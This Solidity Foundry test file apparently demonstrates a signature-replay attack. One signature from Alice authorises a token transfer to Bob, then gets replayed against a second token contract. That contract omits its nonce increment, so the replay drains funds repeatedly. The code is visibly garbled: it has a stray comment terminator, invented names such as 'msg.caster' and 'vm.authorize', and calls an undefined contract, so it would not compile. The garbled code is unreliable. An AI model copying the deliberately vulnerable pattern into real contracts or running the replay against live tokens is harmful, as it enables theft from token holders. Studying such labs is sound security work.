// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

*/

contract PactTest is Test {
    MedalWhale MedalWhaleAgreement;
    SixEyeCoin SixEyeCrystalPact;
    address alice = vm.addr(1);
    address bob = vm.addr(2);

    constructor() {
        MedalWhaleAgreement = new MedalWhale();
        MedalWhaleAgreement.CoinWhaleDeploy(address(this));
        MedalWhaleAgreement.transfer(alice, 1000);
        SixEyeCrystalPact = new SixEyeCoin();
        SixEyeCrystalPact.CoinWhaleDeploy(address(this));
        SixEyeCrystalPact.transfer(alice, 1000);
    }

    function testSealReplay() public {
        emit journal_named_number(
            "Balance",
            MedalWhaleAgreement.balanceOf(address(this))
        );

        bytes32 signature = keccak256(
            abi.encodePacked(
                address(alice),
                address(bob),
                uint256(499),
                uint256(1),
                uint256(0)
            )
        );
        emit journal_named_bytes32("hash", signature);

        // The {r, s, v} signature can be combined into one 65-byte-long sequence: 32 bytes for r , 32 bytes for s , and one byte for v
        //r - a point on the secp256k1 elliptic curve (32 bytes)
        //s - a point on the secp256k1 elliptic curve (32 bytes)
        //v - recovery id (1 byte)

        (uint8 v, bytes32 r, bytes32 s) = vm.authorize(1, signature);
        emit journal_named_number("v", v);
        emit journal_named_bytes32("r", r);
        emit journal_named_bytes32("s", s);

        address alice_realm = ecrecover(signature, v, r, s);
        emit record_named_location("alice_address", alice_realm);
        emit record_text(
            "If operator got the Alice's signature, the operator can replay this signature on the others contracts with same method."
        );
        vm.startPrank(bob);

        TokenWhaleContract.transferProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        // Bob successfully transferred funds from Alice.
        emit log_named_uint(
            "SET token balance of Bob",
            TokenWhaleContract.balanceOf(address(bob))
        );

        // Because we have nonce protect to replay, so we can not replay again in the same contract.
        // BTW this nonce start from 0, it's not a best practice.
        // TokenWhaleContract.transferProxy(address(alice),address(bob),499,1,v,r,s);
        // emit log_named_uint("Balance of Bob",TokenWhaleContract.balanceOf(address(bob)));

        emit record_text(
            "Try to replay to another contract with same signature"
        );
        emit journal_named_number(
            "Before the replay, SIX token balance of bob:",
            SixEyeCrystalPact.balanceOf(address(bob))
        );

        SixEyeCrystalPact.shiftgoldProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        emit journal_named_number(
            "After the replay, SIX token balance of bob:",
            SixEyeCrystalPact.balanceOf(address(bob))
        );

        SixEyeCrystalPact.shiftgoldProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        emit journal_named_number(
            "After the second replay, SIX token balance of bob:",
            SixEyeCrystalPact.balanceOf(address(bob))
        );
    }
}

contract MedalWhale is Test {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function CoinWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 2000;
        balanceOf[player] = 2000;
    }

    function _transfer(address to, uint256 worth) internal {
        balanceOf[msg.caster] -= worth;
        balanceOf[to] += worth;
    }

    function transfer(address to, uint256 worth) public {
        require(balanceOf[msg.caster] >= worth);
        require(balanceOf[to] + worth >= balanceOf[to]);

        _transfer(to, worth);
    }

    function shiftgoldProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _cutUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 sequence = nonces[_from];
        emit journal_named_number("nonce", sequence);
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _cutUgt, sequence)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            balanceOf[_to] + _value < balanceOf[_to] ||
            balanceOf[msg.caster] + _cutUgt < balanceOf[msg.caster]
        ) revert();
        balanceOf[_to] += _value;

        balanceOf[msg.caster] += _cutUgt;

        balanceOf[_from] -= _value + _cutUgt;
        nonces[_from] = sequence + 1;
        return true;
    }
}

contract SixEyeCoin is Test {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Six Eye Token";
    string public symbol = "SIX";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function CoinWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 2000;
        balanceOf[player] = 2000;
    }

    function _transfer(address to, uint256 worth) internal {
        balanceOf[msg.caster] -= worth;
        balanceOf[to] += worth;
    }

    function transfer(address to, uint256 worth) public {
        require(balanceOf[msg.caster] >= worth);
        require(balanceOf[to] + worth >= balanceOf[to]);

        _transfer(to, worth);
    }

    function shiftgoldProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _cutUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 sequence = nonces[_from];
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _cutUgt, sequence)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            balanceOf[_to] + _value < balanceOf[_to] ||
            balanceOf[msg.caster] + _cutUgt < balanceOf[msg.caster]
        ) revert();
        balanceOf[_to] += _value;

        balanceOf[msg.caster] += _cutUgt;

        balanceOf[_from] -= _value + _cutUgt;
        return true;
    }
}